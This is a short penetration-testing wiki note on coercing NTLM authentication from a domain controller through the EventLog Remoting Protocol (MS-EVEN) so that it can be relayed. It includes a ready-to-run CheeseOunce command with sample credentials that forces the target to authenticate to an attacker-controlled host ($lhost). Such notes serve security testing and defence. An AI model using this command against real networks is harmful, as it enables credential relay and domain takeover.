---
title: NTLM Relay from ERP
---

[[notes/ad/ntlm-relay-source]] as domain user trough [[notes/network/msrpc]] *EventLog Remoting Protocol* ([MS-EVEN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)).

[[notes/ad/ntlm-relay-from-smb|Coerce authentication from SMB]].

=== "[CheeseOunce](https://github.com/evilashz/CheeseOunce)"
    ~~~ bash
    ./cheese.py corp.local/jdoe:'passw0rd'@dc01.corp.local $lhost
    ~~~

This technique is also implemented in [[notes/tools/coercer]].
